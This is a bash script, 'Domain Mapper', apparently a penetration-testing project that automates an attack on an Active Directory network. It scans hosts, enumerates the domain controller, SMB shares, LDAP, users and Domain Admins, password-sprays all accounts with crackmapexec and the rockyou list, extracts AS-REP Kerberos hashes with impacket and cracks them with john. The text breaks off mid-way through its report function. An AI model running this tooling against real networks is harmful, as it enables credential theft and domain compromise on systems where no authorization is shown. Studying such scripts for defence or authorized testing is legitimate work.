#!/bin/bash

###############################################################
# Domain Mapper 
# Author: Michael Pritsert
# GitHub: https://github.com/mishap2001
# LinkedIn: https://www.linkedin.com/in/michael-pritsert-8168bb38a
# License: MIT License
###############################################################

RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
MAGENTA="\e[35m"
ENDCOLOR="\e[0m"
echo -e "${RED}==========================================================================${ENDCOLOR}"
printf ${RED}
figlet "Domain Mapper"
printf ${ENDCOLOR}
echo -e "${RED}==========================================================================${ENDCOLOR}"
echo

function ROOT() # check if the user is root. If not, suggests to re-run as root or exit. 
{
	USER=$(whoami)
	if [ $USER != "root" ]; then
	echo -e "${RED}----------${ENDCOLOR}"
	echo -e "${RED}|Warning!| Only root is allowed to run the script.${ENDCOLOR}"
	echo -e "${RED}----------${ENDCOLOR}"
	echo "You can either run the script with sudo or become root."
	echo "Would you like to become one?"
	echo "Yes - become root and run the script again"
	echo "No - exit the script"
	echo "(Y/N)"
		read root_answer
		case $root_answer in
			y|Y)
			echo "Re-running script as root..."
			sudo  bash "$0" "$@"
			exit # exit the script that runs without root to prevent loop
			;;			
			n|N)
			echo "Exiting script!"
			exit
			;;
		esac	
	else
		echo "Checking user..."
		sleep 2
		echo "You are root! Continuing..."
		sleep 2
		echo ""		
	fi	
}

function MENU()
{
echo -e "${RED}=================================${ENDCOLOR}"
echo -e "${RED}OPERATION MODES AND LEVELS MANUAL${ENDCOLOR}"
echo -e "${RED}=================================${ENDCOLOR}"
echo
echo "There are 3 operation modes:"
echo "----------------------------"
echo -e "[1] ${YELLOW}SCANNING${ENDCOLOR}"
echo -e "[2] ${YELLOW}ENUMERATION${ENDCOLOR}"
echo -e "[3] ${YELLOW}EXPLOITATION${ENDCOLOR}"
echo
echo "[*] Each mode has 3 levels: Basic, Intermediate, and Advanced."
echo "[*] A higher level includes everything from the previous levels."
echo
echo "[!] This script runs modes in order:"
echo "    Scanning --> Enumeration --> Exploitation"
echo "    (Enumeration relies on scan results, Exploitation relies on both.)"
echo
echo "[!] Examples for LEVELS:"
echo "    [1] Intermediate scanning runs Basic + Intermediate"
echo "    [2] Advanced scanning runs Basic + Intermediate + Advanced"
echo
echo "[!] Examples for MODES:"
echo "    [1] Enumeration uses data collected during Scanning"
echo "    [2] Exploitation uses data collected during Scanning + Enumeration"
echo
echo "Choose a mode to view its description."
echo "You can return here and view other modes."
echo
echo "When you are ready, press [99] to continue to level selection."
while true; do
	echo
	echo "[1] SCANNING, [2] ENUMERATION, [3] EXPLOITATION, [99] CONTINUE"
	read menu_cho
	echo
	case "$menu_cho" in
		1)
			echo -e "${YELLOW}SCANNING MODE${ENDCOLOR}"
			echo -e "${YELLOW}-------------${ENDCOLOR}"
			echo "Performs structured port scanning on live hosts to identify open services."
			echo "Scan depth increases by level (speed vs coverage)."
			echo
			echo -e "${GREEN}BASIC${ENDCOLOR}"
			echo "Scans the 1000 most common TCP ports on each live host."
			echo
			echo -e "${YELLOW}INTERMEDIATE${ENDCOLOR}"
			echo "Scans all 65,535 TCP ports on each live host."
			echo
			echo -e "${RED}ADVANCED${ENDCOLOR}"
			echo "Scans all TCP ports and performs UDP scanning for broader service discovery."
			echo
			echo -e "${MAGENTA}[!] REMINDER:${ENDCOLOR}"
			echo "Higher levels include lower levels."
		;;
		2)
			echo -e "${YELLOW}ENUMERATION MODE${ENDCOLOR}"
			echo -e "${YELLOW}----------------${ENDCOLOR}"
			echo "Enumerates services and Active Directory infrastructure to identify roles,"
			echo "resources, and domain information. Depth increases by level."
			echo
			echo -e "${GREEN}BASIC${ENDCOLOR}"
			echo "Service/version detection on discovered open ports."
			echo "Identifies Domain Controller, DHCP, DNS, and Default Gateway."
			echo
			echo -e "${YELLOW}INTERMEDIATE${ENDCOLOR}"
			echo "Enumerates key services (FTP, SSH, SMB, WinRM, LDAP, RDP) and checks SMB shares anonymously."
			echo "Runs additional NSE-based checks (DNS brute, anonymous LDAP, SMB protocols/signing)."
			echo
			echo -e "${RED}ADVANCED${ENDCOLOR} ${RED}[!]${ENDCOLOR} Requires valid AD credentials"
			echo "Authenticated AD enumeration: users, groups, shares, password policy,"
			echo "disabled accounts, never-expire accounts, and Domain Admins members."
			echo
			echo -e "${MAGENTA}[!] REMINDER:${ENDCOLOR}"
			echo "Higher levels include lower levels."
		;;
		3)
			echo -e "${YELLOW}EXPLOITATION MODE${ENDCOLOR}"
			echo -e "${YELLOW}-----------------${ENDCOLOR}"
			echo "Executes exploitation checks based on scan + enumeration results."
			echo
			echo -e "${GREEN}BASIC${ENDCOLOR}"
			echo "Runs vulnerability scripts (vuln + vulners) against the Domain Controller."
			echo
			echo -e "${YELLOW}INTERMEDIATE${ENDCOLOR}"
			echo "Performs password spraying to detect weak credentials (using your chosen wordlist)."
			echo
			echo -e "${RED}ADVANCED${ENDCOLOR}"
			echo "Extracts Kerberos tickets and attempts offline cracking."
			echo
			echo -e "${MAGENTA}[!] REMINDER:${ENDCOLOR}"
			echo "Higher levels include lower levels."
		;;
		99)
			INFO_MODE
			break
		;;
		*)
			echo -e "${RED}Invalid input${ENDCOLOR}"
			echo -e "${RED}Choose a valid option${ENDCOLOR}"
		;;
	esac
done
}

function INFO_MODE()
{
echo -e "${GREEN}OPERATION LEVELS${ENDCOLOR}"	
echo -e "${GREEN}----------------${ENDCOLOR}"	
echo

# operation level of scanning mode
while true; do
echo -e "${YELLOW}SCANNING${ENDCOLOR}"
echo "Discovers open ports on live hosts."
echo "Scan depth increases by level."
echo
echo "[*] Please choose a level of operation:"
echo -e "[1] ${GREEN}BASIC${ENDCOLOR} - Scans the 1000 most common TCP ports"
echo -e "[2] ${YELLOW}INTERMEDIATE${ENDCOLOR} - Scans all TCP ports (1–65535)"
echo -e "[3] ${RED}ADVANCED${ENDCOLOR} - Scans all TCP ports and UDP services (may take time)"
read scan_level

case $scan_level in
	1) scan=1
	   break ;;
	2) scan=2
	   break ;;
	3) scan=3
	   break ;;
	*) echo -e "${RED}Invalid input${ENDCOLOR}"
	   echo -e "${RED}Choose a valid option${ENDCOLOR}"
	   echo ;;
esac
done

# operation level of enumeration mode
while true; do
echo
echo -e "${YELLOW}ENUMERATION${ENDCOLOR}"
echo -e "${YELLOW}-----------${ENDCOLOR}"
echo "Collects information about the network and domain."
echo "Identifies services, key infrastructure servers,"
echo "and—when credentials are provided—domain objects and policies."
echo
echo "[*] Please choose a level of operation:"
echo -e "[1] ${GREEN}BASIC${ENDCOLOR} - Services, Domain Controller, DHCP, DNS, Default Gateway"
echo -e "[2] ${YELLOW}INTERMEDIATE${ENDCOLOR} - Key services, anonymous shares, NSE checks"
echo -e "[3] ${RED}ADVANCED${ENDCOLOR} - Users, groups, shares, policies, admin accounts ${RED}[!]${ENDCOLOR} Requires valid AD credentials"
read enum_level

case $enum_level in
	1) enum=1
	   break ;;
	2) enum=2
	   break ;;
	3) enum=3
	   break ;;
	*) echo -e "${RED}Invalid input${ENDCOLOR}"
	   echo -e "${RED}Choose a valid option${ENDCOLOR}"
	   echo ;;
esac
done

# operation level of exploitation mode
while true; do	
echo
echo -e "${YELLOW}EXPLOITATION${ENDCOLOR}"	
echo -e "${YELLOW}------------${ENDCOLOR}"
echo
echo "[*] Please choose a level of operation:"
echo -e "[1] ${GREEN}BASIC${ENDCOLOR} - Vulnerability scanning using NSE scripts"
echo -e "[2] ${YELLOW}INTERMEDIATE${ENDCOLOR} - Password spraying to detect weak credentials"
echo -e "[3] ${RED}ADVANCED${ENDCOLOR} - Kerberos ticket extraction and offline cracking"
read exp_level

case $exp_level in
	1) exp=1
	   break ;;
	2) exp=2
	   break ;;
	3) exp=3
	   break ;;
	*) echo -e "${RED}Invalid input${ENDCOLOR}"
	   echo -e "${RED}Choose a valid option${ENDCOLOR}"
	   echo ;;
esac
done	

# information gathering for scanning mode
if [[ "$scan" == 1 || "$scan" == 2 || "$scan" == 3 ]]; then
echo
echo -e "${RED}--------------------------------------${ENDCOLOR}"
echo -e "${RED}Please enter the requested information${ENDCOLOR}"
echo -e "${RED}--------------------------------------${ENDCOLOR}"
echo
echo "[*] Enter The Target Network Range (examples):"
echo "  1.2.3.0-255   |   1.2.3.0/24   |   1.2.3.*  "  
read network_range
echo
if nmap -sL "$network_range" 2>&1 | grep -q "Failed to resolve"; then
	echo -e "${RED}[!] The chosen range is not valid.${ENDCOLOR}"
	echo
	echo -e "${RED}EXITING${ENDCOLOR}"
	exit
else
	echo -e "${GREEN}[*] This is a valid range${ENDCOLOR}"
	echo
fi	
echo -e "${YELLOW}[!]${ENDCOLOR} Target range selected: ${YELLOW}$network_range${ENDCOLOR}"
echo
sleep 1
echo "Searching for live hosts..."
nmap -sn "$network_range" | awk '{print $5}' | grep ^[0-9] > live_hosts.txt
live_num=$(cat live_hosts.txt | wc -l)
echo -e "${YELLOW}[!]${ENDCOLOR} Number of live hosts discovered: ${YELLOW}$live_num${ENDCOLOR}" 
echo
fi

# information gathering for enumeration mode
if [ $enum == 3 ]; then
echo "[*] Enter target domain name:"
read target_domain
echo
echo -e "${YELLOW}[!]${ENDCOLOR} Target domain selected: ${YELLOW}$target_domain${ENDCOLOR}"
echo 
echo "[*] Enter AD (Active Directory) credentials:"
read -p "[U] USERNAME: " ad_user
read -p "[P] PASSWORD: " ad_pass
echo
echo -e "${YELLOW}[!]${ENDCOLOR} Username: ${YELLOW}$ad_user${ENDCOLOR}"
echo -e "${YELLOW}[!]${ENDCOLOR} Password: ${YELLOW}$ad_pass${ENDCOLOR}"
echo
fi

# information gathering for exploitation mode
if [[ $exp == 2 || $exp == 3 ]]; then
echo "[*] A password list is required for some exploitation steps."
echo "[1] Use the default password list (rockyou)"
echo "[2] Use a custom password list"
echo 
while true; do
read pass_cho
case "$pass_cho" in
	1) 
	echo "Looking for rockyou.txt..."
	if [ -f /usr/share/wordlists/rockyou.txt ]; then
		echo "List found."
		echo		
		echo -e "${YELLOW}[!]${ENDCOLOR} Using default list: ${YELLOW}rockyou${ENDCOLOR}." 
		pass_lst=/usr/share/wordlists/rockyou.txt
	else
		echo "List not found, installing..."
		apt install -y -qq wordlists >/dev/null 2>&1
		gzip -dk /usr/share/wordlists/rockyou.txt.gz
		pass_lst=/usr/share/wordlists/rockyou.txt
		echo -e "List installed at: ${YELLOW}/usr/share/wordlists/rockyou.txt${ENDCOLOR}"
	fi	
	break ;;
	2) 
	echo "[*] Enter the full path to your password list:"
	read path_lst
	if [ -f "$path_lst" ]; then
		echo -e "${YELLOW}[!]${ENDCOLOR} Password list found."
		pass_lst="$path_lst"
	else
		echo -e "${RED}[!]${ENDCOLOR} List not found. Defaulting to ${YELLOW}rockyou${ENDCOLOR}."
		echo "Looking for rockyou.txt..."
		if [ -f /usr/share/wordlists/rockyou.txt ]; then
			echo "List found."
			pass_lst=/usr/share/wordlists/rockyou.txt
		else
			echo "List not found, installing..."
			apt install -y -qq wordlists >/dev/null 2>&1 
			gzip -dk /usr/share/wordlists/rockyou.txt.gz
			pass_lst=/usr/share/wordlists/rockyou.txt
			echo -e "List installed at: ${YELLOW}/usr/share/wordlists/rockyou.txt${ENDCOLOR}"
		fi
	fi			
	break ;;
	*) echo -e "${RED}Invalid input${ENDCOLOR}"
	   echo -e "${RED}Choose 1 or 2${ENDCOLOR}" ;;
esac
done
fi
}

function SCAN_MODE()
{
	mkdir -p RESULTS
	scan_level="$scan"
	case $scan_level in
		1)
			echo
			echo -e "${MAGENTA}=====COMMENCING BASIC SCANNING=====${ENDCOLOR}"
			echo
			for ip in $(cat live_hosts.txt); do
			echo -e "[*] ${GREEN}Basic${ENDCOLOR} TCP scan on ${ip}"
			nmap "$ip" > "RESULTS/${ip}"
			echo
			done
		;;
		2)
			echo
			echo -e "${MAGENTA}=====COMMENCING INTERMEDIATE SCANNING=====${ENDCOLOR}"
			echo
			for ip in $(cat live_hosts.txt); do
			echo -e "[*] ${YELLOW}Full TCP${ENDCOLOR} scan on ${ip}"
			nmap -p- "$ip" > "RESULTS/${ip}"
			echo
			done
		;;
		3)
			echo
			echo -e "${MAGENTA}=====COMMENCING ADVENCED SCANNING=====${ENDCOLOR}"
			echo
			for ip in $(cat live_hosts.txt); do
			echo -e "[*] ${RED}Running full TCP${ENDCOLOR} scan on ${ip}"
			nmap -p- "$ip" > "RESULTS/${ip}"
			echo -e "[*] ${RED}Running full UDP${ENDCOLOR} scan on ${ip} (this may take a while)"
			masscan -pU:0-65535 "$ip" >> "RESULTS/${ip}"
			echo
			done
		;;
	esac
}

function ENUM_MODE()
{
	enum_level="$enum"
	case $enum_level in
		1)	
			echo -e "${MAGENTA}=====COMMENCING BASIC ENUMERATION=====${ENDCOLOR}"
			BASIC_ENUM
		;;
		2)
			echo -e "${MAGENTA}=====COMMENCING INTERMEDIATE ENUMERATION=====${ENDCOLOR}"
			BASIC_ENUM
			INT_ENUM
		;;
		3)  echo -e "${MAGENTA}=====COMMENCING ADVANCED ENUMERATION=====${ENDCOLOR}"
			BASIC_ENUM
			INT_ENUM
			ADV_ENUM
		;;
	esac	
}

function BASIC_ENUM()
{
# Service detection for open ports
for ip in $(cat live_hosts.txt); do
echo
echo -e "${GREEN}[*] Identifying services on the open ports of ${ip}${ENDCOLOR}"
tcp_ports=$(cat "RESULTS/${ip}" | grep /tcp | awk -F '/' '{print $1}' | sort -n -u | paste -sd,)
udp_ports=$(cat "RESULTS/${ip}" | grep /udp | awk -F '/' '{print $1}' | sort -n -u | paste -sd,)
if [ -n "$tcp_ports" ] && [ -n "$udp_ports" ];then # If there are both TCP and UDP ports
		ports="T:$tcp_ports,U:$udp_ports"
		nmap -sV -sU -sS -p"$ports" "${ip}" >> "RESULTS/${ip} SERVICES" # Must add -sU or nmap will not scan the UDP ports
elif [ -n "$tcp_ports" ] && [ -z "$udp_ports" ];then # If there are only TCP ports
		ports="T:$tcp_ports"
		nmap -sV -sS -p"$ports" "${ip}" >> "RESULTS/${ip} SERVICES" 
elif [ -z "$tcp_ports" ] && [ -n "$udp_ports" ];then # If there are only UDP ports
		ports="U:$udp_ports"
		nmap -sV -sU -p"$ports" "${ip}" >> "RESULTS/${ip} SERVICES" # Must add -sU or nmap will not scan the UDP ports
fi
done
	
# Domain Controller Detection
echo
echo -e "${GREEN}[*] Identifying the Domain Controller${ENDCOLOR}"
for ip in $(cat live_hosts.txt); do 
nmap "$ip" --script=smb-os-discovery >> "RESULTS/${ip}_temp_file"
done
domain_ip=$(grep -H -m1 --color=never 'Domain name' RESULTS/*_temp_file | awk -F ':' '{print $1}' | awk -F '/' '{print $2}' | awk -F '_' '{print $1}')
domain_name=$(grep -m1 --color=never 'Domain name' "RESULTS/${domain_ip}_temp_file" | awk '{print $4}')
domain_pc=$(grep -m1 --color=never 'Computer name' "RESULTS/${domain_ip}_temp_file" | awk '{print $4}')
domain_os=$(grep -o -m1 --color=never "OS:.*" "RESULTS/${domain_ip}_temp_file" | sed 's/^OS: //')
echo
echo -e "The IP of the Domain is ${YELLOW}${domain_ip}${ENDCOLOR}" | tee "RESULTS/GENERAL INFO.txt"
echo
echo -e "The name of the detected Domain Name is ${YELLOW}${domain_name}${ENDCOLOR}" | tee -a "RESULTS/GENERAL INFO.txt" 
echo
echo -e "The name of the detected Domain Computer is ${YELLOW}${domain_pc}${ENDCOLOR}" | tee -a "RESULTS/GENERAL INFO.txt"
echo
echo -e "The OS of the detected Domain Computer is ${YELLOW}${domain_os}${ENDCOLOR}" | tee -a "RESULTS/GENERAL INFO.txt"
echo
if [[ "$enum" == 3 && -n "$target_domain" && "$domain_name" != "$target_domain" ]]; then
	echo -e "${RED}[!] The detected domain name and the one you entered are different!${ENDCOLOR}"
	echo "Replacing the domain name to the detected one..."
	target_domain="$domain_name"
fi
for ip in $(cat live_hosts.txt); do
rm -f "RESULTS/${ip}_temp_file"				#Delete unnecessary files
done

# DHCP Detection
echo
echo -e "${GREEN}[*] Identifying the DHCP server IP${ENDCOLOR}"	
nmap --script=broadcast-dhcp-discover >> "RESULTS/GENERAL INFO.txt" 2>/dev/null
dhcp_ip=$(grep 'Server Identifier' "RESULTS/GENERAL INFO.txt" | awk '{print $4}')
echo
echo -e "The IP of the DHCP is ${YELLOW}${dhcp_ip}${ENDCOLOR}" | tee -a "RESULTS/GENERAL INFO.txt"

# DNS Detection
echo
echo -e "${GREEN}[*] Identifying the DNS server IP${ENDCOLOR}"
sleep 1
dns_ip=$(grep 'Domain Name Server' "RESULTS/GENERAL INFO.txt" | awk '{print $5}')
echo
echo -e "The IP of the DNS is ${YELLOW}${dns_ip}${ENDCOLOR}" | tee -a "RESULTS/GENERAL INFO.txt"

# Default Gateway Detection
echo
echo -e "${GREEN}[*] Identifying the Default Gateway IP${ENDCOLOR}"
sleep 1
router_ip=$(grep 'Router' "RESULTS/GENERAL INFO.txt" | awk '{print $3}')
echo
echo -e "The IP of the Default Gateway is ${YELLOW}${router_ip}${ENDCOLOR}"	 | tee -a "RESULTS/GENERAL INFO.txt"
echo
}

function INT_ENUM()
{

# IP enumeration for key services: FTP (20, 21), SSH (22) , SMB (139, 445) , WinRM (5985, 5986) , LDAP (389, 636) , RDP (3389).
echo -e "${GREEN}[*] Starting Enumeration of Key Services${ENDCOLOR}"
for ip in $(cat live_hosts.txt); do
	echo
	echo "Enumerating ${ip}"
	echo "==================KEY SERVICES=================" >> "RESULTS/${ip}"
	nmap -Pn -sV -p 20,21,22,139,445,5985,5986,389,636,3389 "$ip" >> "RESULTS/${ip}"
done

# Checks whether anonymous SMB share enumeration is permitted and saves exposed shares if found
echo
echo -e "${GREEN}[*] Starting Enumeration of Shared Folders${ENDCOLOR}"
echo
echo "[!] Trying to enumerate anonymously"
shares_int=$(netexec smb "$domain_ip" -u '' -p '' --shares) 
if echo "$shares_int" | grep -qiE 'STATUS_ACCESS_DENIED|ACCESS_DENIED|LOGON_FAILURE'; then
    echo
    echo -e "${YELLOW}[*] Anonymous share enumeration is denied.${ENDCOLOR}"
else
	echo
	echo -e "${RED}[!] Anonymous share enumeration is allowed${ENDCOLOR}"
    echo "[!] Exposed shares:"
    echo "$shares_int" | tee "RESULTS/EXPOSED SHARES"
fi

# relevant NSE scripts for domain enumeration

# The dns brute NSE script attempts to discover internal hostnames by brute forcing 
# common DNS names within a specified domain using unauthenticated DNS queries.
echo
echo -e "${GREEN}[*] Trying to expose hostnames via brute forcing the DNS${ENDCOLOR}"
dns_brute=$(nmap -Pn "$dns_ip" --script=dns-brute --script-args dns-brute.domain="$domain_name" --dns-servers "$dns_ip" 2>/dev/null)
if echo "$dns_brute" | grep -q "DNS Brute-force hostnames: No results."; then
  echo
  echo "[*] No hostnames exposed during DNS brute force enumeration"
else
  echo
  echo "[!] Some hostnames may have been exposed during DNS brute force enumeration."
  echo "[!] The results can be found under 'EXPOSED HOSTNAMES'"
  echo "$dns_brute" > "RESULTS/EXPOSED HOSTNAMES"
fi

# The ldap-search NSE script attempts to enumerate LDAP anonymously.
echo
echo -e "${GREEN}Trying to enumerate LDAP anonymously${ENDCOLOR}"
echo
ldap_search=$(nmap -Pn -p389 --script=ldap-search "$domain_ip" 2>/dev/null)
if echo "$ldap_search" | grep -q 'dn:'; then
   echo "[!] Some directory objects may have been exposed via anonymous LDAP"
   echo "[!] Results saved to 'RESULTS/EXPOSED LDAP OBJECTS'"
   echo "$ldap_search" > "RESULTS/EXPOSED LDAP OBJECTS"
else
   echo "[*] No directory objects were exposed via anonymous LDAP enumeration"   
fi

# smb 
# The smb-protocols NSE script identifies which SMB versions are available
# The smb2-security-mode checks whether SMBv2/3 requires signing 
echo
echo -e "${GREEN}Identifying SMB versions and signing requirements${ENDCOLOR}"
echo
smb_scan=$(nmap -Pn -p445 --script smb-protocols,smb2-security-mode "$domain_ip" 2>/dev/null)
if echo "$smb_scan" | grep -q "NT LM 0.12"; then
    echo "[!] SMBv1 is enabled - susceptible to legacy attacks"
else
    echo "[*] SMBv1 is disabled"
fi

if echo "$smb_scan" | grep -qi "signing.*required"; then
    echo "[*] SMB signing is required"
else
    echo "[!] SMB signing is not required"
fi
}

function ADV_ENUM()
{

# user extraction
echo
echo -e "${GREEN}[*] Extracting Users${ENDCOLOR}"
netexec smb "$domain_ip" -u "$ad_user" -p "$ad_pass" --users > "RESULTS/USERS"
echo
all_users=$(awk '{print $5}' "RESULTS/USERS" | grep -E --color=never "^[a-zA-Z]|^[0-9]")
total_users=$(awk '{print $5}' "RESULTS/USERS" | grep -E --color=never "^[a-zA-Z]|^[0-9]" | wc -l)
echo "The Usernames on the domain are:"
echo "$all_users"
echo
echo -e "${YELLOW}[*] There is a total of $total_users users.${ENDCOLOR}"

# groups extraction
echo
echo -e "${GREEN}[*] Extracting Groups${ENDCOLOR}"
netexec ldap "$domain_ip" -u "$ad_user" -p "$ad_pass" --groups > "RESULTS/GROUPS"
groups=$(grep membercount "RESULTS/GROUPS" | sed 's/^.*'${domain_pc}'  //' )
groups_total=$(grep membercount "RESULTS/GROUPS" | sed 's/^.*'${domain_pc}'  //' | wc -l)
echo
echo "The Groups of the domain are:"
echo "$groups"
echo
echo -e "${YELLOW}[*] There is a total of $groups_total groups.${ENDCOLOR}"
# shares extraction
echo
echo -e "${GREEN}[*] Extracting Shares${ENDCOLOR}"
netexec smb "$domain_ip" -u "$ad_user" -p "$ad_pass" --shares > "RESULTS/SHARES"
shares=$(tail -n +4 "RESULTS/SHARES" | grep -oP --color=never ''${domain_pc}' .*'| sed 's/'${domain_pc}'//g')
total_shares=$(tail -n +6 "RESULTS/SHARES" | grep -oP --color=never ''${domain_pc}' .*'| sed 's/'${domain_pc}'//g'| wc -l)
echo
echo "The Domain is sharing the next directories:"
echo "$shares"
echo
echo -e "${YELLOW}[*] There is a total of $total_shares shared directories.${ENDCOLOR}"

# password policy extraction
echo
echo -e "${GREEN}[*] Extracting Password policy${ENDCOLOR}"
netexec smb "$domain_ip" -u "$ad_user" -p "$ad_pass" --pass-pol > "RESULTS/PASS POLICY"
#policies for echo
min_length=$(grep 'Minimum password length' "RESULTS/PASS POLICY"  | sed 's/'.*${domain_pc}'//g')
max_history=$(grep 'Password history' "RESULTS/PASS POLICY"  | sed 's/'.*${domain_pc}'//g')
max_age=$(grep 'Maximum password' "RESULTS/PASS POLICY"  | sed 's/'.*${domain_pc}'//g')
complexity=$(grep 'Password Complexity Flags:' "RESULTS/PASS POLICY"  | sed 's/'.*${domain_pc}'//g')
lockout=$(grep 'Account Lockout Threshold:' "RESULTS/PASS POLICY"  | sed 's/'.*${domain_pc}'//g')
echo
echo "[*]$min_length"
if echo "$complexity" | grep -q "000001"; then
	echo "[*]  Password Complexity - Enabled"
else
	echo "[*]  Password Complexity - Disabled"
fi
echo "[*]$max_history"
echo "[*]$max_age"
echo "[*]$lockout"

# disabled account identification
echo
echo -e "${GREEN}[*] Extracting Disabled Accounts${ENDCOLOR}"
netexec ldap "$domain_ip" -u "$ad_user" -p "$ad_pass" --active-users > "RESULTS/ENABLED USERS"
active_users=$(awk '{print $5}' "RESULTS/ENABLED USERS" | grep -E --color=never "^[a-z]|^[A-Z]|^[0-9]")
echo
echo "[*] The next accounts are disabled:"
for user in $all_users; do
	if echo "$active_users" | grep -qx "$user"; then
		continue
	else
		echo "[!] $user" | tee -a "RESULTS/DISABLED ACCOUNTS"
	fi
done
if [[ ! -s "RESULTS/DISABLED ACCOUNTS" ]]; then
	echo -e "${GREEN}[*] No disabled accounts found.${ENDCOLOR}"
else
total_disabled=$(cat "RESULTS/DISABLED ACCOUNTS" | wc -l)	
echo
echo -e "${YELLOW}[*] There is a total of $total_disabled accounts.${ENDCOLOR}"
fi

# never expired account identification
echo
echo -e "${GREEN}[*] Extracting Never Expired Accounts${ENDCOLOR}"
nxc ldap "$domain_ip" -u "$ad_user" -p "$ad_pass" --query \
"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))" "sAMAccountName" > "RESULTS/NEVER EXPIRED"
echo
never_expire_acc=$(awk '{print $NF}' "RESULTS/NEVER EXPIRED" | grep CN | awk -F ',' '{print $1}' | awk -F '=' '{print $2}')
total_never_expire_acc=$(awk '{print $NF}' "RESULTS/NEVER EXPIRED" | grep CN | awk -F ',' '{print $1}' | awk -F '=' '{print $2}' | wc -l)
if [[ -z "$never_expire_acc" ]]; then
	echo -e "${GREEN}[*] No accounts with 'password never expires' flag found.${ENDCOLOR}"
else
	echo "[*] The following accounts never expire:"
	echo "$never_expire_acc"
	echo
	echo -e "${YELLOW}[*] There is a total of $total_never_expire_acc never expired accounts.${ENDCOLOR}"
fi

# account that are members of the domain group identification
echo
echo -e "${GREEN}[*] Extracting Members of the Domain Admins group${ENDCOLOR}"
netexec ldap "$domain_ip" -u "$ad_user" -p "$ad_pass" --groups 'Domain Admins' > "RESULTS/DOMAIN ADMINS Gr."
domain_admins_usr=$(awk '{print $5}' "RESULTS/DOMAIN ADMINS Gr." | grep -E '^[a-zA-Z]' )
total_domain_admins_usr=$(awk '{print $5}' "RESULTS/DOMAIN ADMINS Gr." | grep -E '^[a-zA-Z]' | wc -l)
echo
echo "[*] The next accounts are members of the Domain Admins group:"
echo "$domain_admins_usr"
echo
echo -e "${YELLOW}[*] There is a total of $total_domain_admins_usr members of the Domain Admins group.${ENDCOLOR}"
}

function EXP_MODE()
{
	exp_level="$exp"
	case $exp_level in
		1)	
			echo
			echo -e "${MAGENTA}=====COMMENCING BASIC EXPLOITATION=====${ENDCOLOR}"
			echo
			BASIC_EXP
		;;
		2)
			echo
			echo -e "${MAGENTA}=====COMMENCING INTERMEDIATE EXPLOITATION=====${ENDCOLOR}"
			echo
			BASIC_EXP
			INT_EXP
		;;
		3)  
			echo
			echo -e "${MAGENTA}=====COMMENCING ADVANCED EXPLOITATION=====${ENDCOLOR}"
			echo
			BASIC_EXP
			INT_EXP
			ADV_EXP
		;;
	esac	
}	

function BASIC_EXP()
{
	echo -e "${GREEN}[*] Enumerating vulnerabilities on the Domain Controller${ENDCOLOR}"
	# Using both 'vuln' and 'vulners' enables vulnerability discovery through
	# active service probing and version based CVE correlation
	# against external vulnerability databases.
	nmap -sV --script=vuln,vulners ${domain_ip} > "RESULTS/DC VULNERABILITIES"
	echo
	echo "Saved results under RESULTS/DC VULNERABILITIES"
}

function INT_EXP()
{
	#creating a user list based on information from enumeration mode
	echo "$all_users" > user.lst
	echo -e "${GREEN}[*] Executing domain wide password spraying to identify weak credentials${ENDCOLOR}"
	echo
	# using either the provided password list or rockyou 
	# $pass_lst is defined according to $pass_cho and confirmation of existence
	crackmapexec smb ${domain_ip} -d ${target_domain} -u user.lst -p "$pass_lst" --continue-on-success | \
	grep + | sed 's/.*'${domain_pc}'//g' | awk '{print $2}' > "RESULTS/WEAK CREDENTIALS"
	# only present users with weak passwords
	if grep -q ^[a-zA-Z0-9] "RESULTS/WEAK CREDENTIALS"; then
		echo "[!] The following credentials are weak:"
		cat "RESULTS/WEAK CREDENTIALS" |  awk -F '\' '{print $2}'
	else
		echo "[*] No weak credentials found"
	fi
	if grep -q '${domain_name}\\:' "RESULTS/WEAK CREDENTIALS"; then
	   if echo "$shares_int" | grep -qiE 'STATUS_ACCESS_DENIED|ACCESS_DENIED|LOGON_FAILURE'; then
	       echo
	       echo "[!] Anonymous connection is allowed, but enumeration of any kind is denied."
	   else
	       echo
	       echo "[!] Anonymous connection and enumeration is allowed!"
	   fi
	fi
}

function ADV_EXP()
{
	# using impacket to extract the tickets	
	echo	
	echo -e "${GREEN}[*] Extracting kerberos tickets${ENDCOLOR}"		
	impacket-GetNPUsers -dc-ip "$domain_ip" "$domain_name"/ -usersfile user.lst -format john -output Hashes > /dev/null 2>&1
	# john the extracted tickets
	echo
	echo -e "${GREEN}[*] Trying to crack extracted tickets${ENDCOLOR}"
	echo
	john Hashes --wordlist="$pass_lst" > /dev/null 2>&1
    john --show Hashes > "RESULTS/CRACKED" 2>/dev/null
	# check if cracking was successful, if not - display unsuccessful and delete CRACKED
	if grep -iq "@${domain_name}" "RESULTS/CRACKED" > /dev/null 2>&1; then
		for user in $(cat user.lst); do
			if  grep -qi "$user" "RESULTS/CRACKED"; then
			echo -e "${RED}[!] The account $user have been cracked${ENDCOLOR}"
			fi
		done
	else
		echo -e "${GREEN}No accounts have been cracked.${ENDCOLOR}"
	fi
}

function REPORT()
{
echo
echo "===============DOMAIN MAPPER REPORT==============="
echo
echo "[*] GENERAL INFORMATION"
echo "The IP of the Domain is ${domain_ip}"
echo
echo "The name of the detected Domain Name is ${domain_name}"
echo
echo "The name of the detected Domain Computer is ${domain_pc}"
echo
echo "The OS of the detected Domain Computer is ${domain_os}"
echo
echo "The IP of the DHCP is ${dhcp_ip}"
echo
echo "The IP of the DNS is ${dns_ip}"
echo
echo "The IP of the Default Gateway is ${router_ip}"
echo
echo "[*] LIVE HOSTS"
cat live_hosts.txt
echo
# if users were extracted
if [  -f "RESULTS/USERS" ]; then
echo "[*] USERS"
echo "--------------------------------"
echo
echo "$all_users"
echo
echo "[*] There is a total of $total_users users."
echo
fi
# if groups were extracted
if [  -f "RESULTS/GROUPS" ]; then
echo "[*] GROUPS"
echo "--------------------------------"
echo
echo "$groups"
echo
echo "[*] There is a total of $groups_total users."
echo
fi
# if shares were extracted
if [  -f "RESULTS/SHARES" ]; then
echo "[*] SHARES"
echo "--------------------------------"
echo
echo "$shares"
echo
echo "[*] There is a total of $total_shares users."
echo
fi
# if password policy was extracted
if [  -f "RESULTS/PASS POL" ]; then
echo "[*] PASSWORD POLICY"
echo "--------------------------------"
echo
echo "[*]$min_length"
if  echo "$complexity" | grep -q "000001"; then
	echo "[*]  Password Complexity - Enabled"
else
	echo "[*]  Password Complexity - Disabled"
fi
echo "[*]$max_history"
echo "[*]$max_age"
echo "[*]$lockout"
echo
fi
# if disabled accounts extracted
